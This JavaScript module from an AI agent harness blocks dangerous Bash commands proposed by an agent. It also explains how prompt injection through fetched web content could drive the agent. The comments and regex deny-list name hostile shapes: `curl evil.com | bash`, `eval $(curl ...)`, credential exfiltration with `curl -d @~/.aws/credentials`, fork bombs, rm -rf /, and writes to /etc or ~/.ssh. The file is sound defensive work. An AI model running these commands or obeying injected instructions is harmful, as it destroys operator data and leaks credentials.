// SPDX-License-Identifier: AGPL-3.0-only
// bash-safety.js — L4 Wall 5: Bash dangerous-command refusal + audience
// trip-wire.
//
// The capability-scope gate (permission.js) tells us WHICH steps may
// invoke Bash. It does not tell us WHICH commands are safe. Without this
// module, a prompt-injected partner could fire `curl evil.com | bash`
// from the code/verify step because verify legitimately needs Bash.
//
// Two layers:
//
//   1. Pattern refusal — a small allowlist of canonical destructive shapes
//      (rm -rf on root-adjacent paths, pipe-to-shell from network,
//      privilege-escalation writes). NOT exhaustive — sandbox v2 (Docker
//      + seccomp) is the real fix. This is the cheap, deterministic
//      pre-filter that catches the prompt-injection script kiddies.
//
//   2. Audience trip-wire — once any tool in the agentic loop returned
//      audience='external' (subsystem sticky flag), Bash is REFUSED for
//      the rest of the turn regardless of command content. Rationale:
//      external content is the #1 prompt-injection vector. If the model
//      has read untrusted text AND then proposes a shell command, we
//      assume the worst. The model can pivot to read-only inspection
//      (Grep, Read, Glob) or escalate to the operator via
//      operator_request{kind:'approval'}.
//
// API:
//   isCommandSafe(command, ctx) → { allowed, reason?, pattern?, severity? }
//
// Return shape:
//   { allowed: true }                                          — green-light
//   { allowed: false, reason, pattern, severity: 'block' }     — pattern hit
//   { allowed: false, reason: 'external_content_taint',
//     severity: 'block' }                                      — trip-wire

// Canonical destructive shapes. Each entry: { name, pattern, why }.
// Patterns are evaluated against the literal command string (untrimmed).
// Keep this list TIGHT — every entry should map to a real attacker
// playbook, not a paranoid wildcard. Operator escapes via the explicit
// operator_request{kind:'approval'} path if a legit workflow needs one.
const DANGEROUS_PATTERNS = Object.freeze([
  {
    name: 'rm_rf_root_adjacent',
    pattern: /\brm\s+(?:-[a-zA-Z]*r[a-zA-Z]*f|-[a-zA-Z]*f[a-zA-Z]*r)\s+(?:\/\s*(?:$|[^a-zA-Z0-9_.])|\/[*]|~\s*$|~\/\s*$|\.\.\/\.\.|--no-preserve-root)/,
    why: 'rm -rf on / or ~ or with --no-preserve-root will destroy operator data'
  },
  {
    name: 'pipe_to_shell_from_network',
    // curl/wget URL | sh|bash — the canonical drive-by RCE shape.
    pattern: /\b(?:curl|wget|fetch)\b[^|]*\|\s*(?:sh|bash|zsh|ksh|fish|dash|sh\s+-[a-z]*)\b/,
    why: 'piping network content directly to a shell is the canonical drive-by RCE'
  },
  {
    name: 'eval_from_network',
    pattern: /\beval\s+["'`]?\$\((?:curl|wget|fetch)\b/,
    why: 'eval $(curl ...) executes attacker-controlled bytes in the operator shell'
  },
  {
    name: 'shutdown_or_reboot',
    pattern: /\b(?:shutdown|reboot|halt|poweroff)\b(?!\s+--help)/,
    why: 'shutdown/reboot is operator-deliberate; the autonomous partner has no business issuing it'
  },
  {
    name: 'fork_bomb',
    pattern: /:\(\)\s*\{\s*:\|:&\s*\}\s*;\s*:/,
    why: 'shell fork bomb'
  },
  {
    name: 'dd_to_block_device',
    pattern: /\bdd\b[^\n]*\bof\s*=\s*\/dev\/(?:sd[a-z]|nvme|disk|hd[a-z])/,
    why: 'dd of=/dev/sdX overwrites raw disks'
  },
  {
    name: 'chmod_world_writable_root',
    pattern: /\bchmod\s+(?:-[a-zA-Z]+\s+)?(?:777|a\+w)\s+\//,
    why: 'chmod 777 / opens the entire filesystem to any user/process'
  },
  {
    name: 'chown_root',
    pattern: /\bchown\s+(?:-[a-zA-Z]+\s+)?(?:root:|:root)\s+/,
    why: 'chown root:* on operator files is privilege manipulation'
  },
  {
    name: 'rewrite_etc',
    // `>` is not a word boundary, so `\b>` never matches. Anchor on
    // whitespace or start-of-string instead.
    pattern: /(?:^|\s)(?:>\s*\/etc\/|tee\s+\/etc\/|cp\s+\S+\s+\/etc\/|mv\s+\S+\s+\/etc\/)/,
    why: 'writing to /etc/ mutates operator system config'
  },
  {
    name: 'rewrite_ssh_config',
    pattern: /(?:^|\s)(?:>\s*~\/\.ssh\/|tee\s+~?\/?\.ssh\/|>\s*\$HOME\/\.ssh\/)/,
    why: 'writing under ~/.ssh/ is credential manipulation'
  },
  {
    name: 'sudo_passwordless',
    pattern: /\bsudo\b(?:\s+-[a-zA-Z]+)*\s+(?:rm|chmod|chown|dd|sh|bash|\/[a-zA-Z])/,
    why: 'sudo invocation escalates beyond the partner\'s normal scope'
  },
  {
    name: 'rewrite_mcp_clients',
    // The external-MCP registry is the ONLY authorization gate on which
    // downstream servers mcp_call can reach; a partner-written entry is
    // self-authorization. Block shell writes the same
    // way the Write/Edit tools are blocked by path-policy.
    pattern: /(?:>>?|\btee\b|\bcp\b|\bmv\b|\bsed\b[^|;&\n]*-i)[^|;&\n]*(?:~\/\.troth\/mcp-clients\.json|\$HOME\/\.troth\/mcp-clients\.json)/,
    why: 'shell write to the external-MCP registry = self-authorization'
  },
  {
    name: 'exfiltrate_credentials',
    // Accept any non-alphanumeric byte (space, quote, @, =) before the
    // credential-path prefix. `curl -d @~/.aws/credentials` is the
    // canonical attacker shape — the `@` precedes the path because it
    // tells curl to read from file.
    pattern: /\b(?:curl|wget|fetch|nc|netcat)\b[^|;&\n]*(?:~\/\.ssh\/|\$HOME\/\.ssh\/|~\/\.aws\/|\$HOME\/\.aws\/|~\/\.troth\/credentials\.json|\$HOME\/\.troth\/credentials\.json)/,
    why: 'network read of credential files = exfiltration attempt'
  }
]);

// Strict-taint switch (default OFF). See path-policy.js for the full rationale.
function _strictTaint() {
  return /^(1|true|on|yes)$/i.test(String(process.env.TROTH_TAINT_STRICT || ''));
}

function isCommandSafe(command, ctx) {
  if (typeof command !== 'string' || !command.length) {
    return { allowed: false, reason: 'empty_command', severity: 'block' };
  }

  // Layer 2 — external-content trip-wire (CaMeL taint). OFF BY DEFAULT.
  // Blocking ALL Bash after any web_fetch breaks "research → build" (npm
  // install / node / git can't run). The real exfil/destruction shapes
  // (exfiltrate_credentials, curl|sh, rm -rf /, fork bomb) are caught by
  // Layer 1 below regardless of taint. Opt in with TROTH_TAINT_STRICT=1.
  if (ctx && ctx._l4_external_seen === true && _strictTaint()) {
    return {
      allowed:  false,
      reason:   'external_content_taint',
      severity: 'block',
      detail:   'Bash refused (TROTH_TAINT_STRICT) while external (web-fetched) content is in the agentic loop.'
    };
  }

  // Layer 1 — pattern check. First match wins (deterministic).
  for (const p of DANGEROUS_PATTERNS) {
    if (p.pattern.test(command)) {
      return {
        allowed:  false,
        reason:   'dangerous_pattern',
        pattern:  p.name,
        severity: 'block',
        detail:   p.why
      };
    }
  }

  return { allowed: true };
}

module.exports = {
  isCommandSafe,
  DANGEROUS_PATTERNS
};
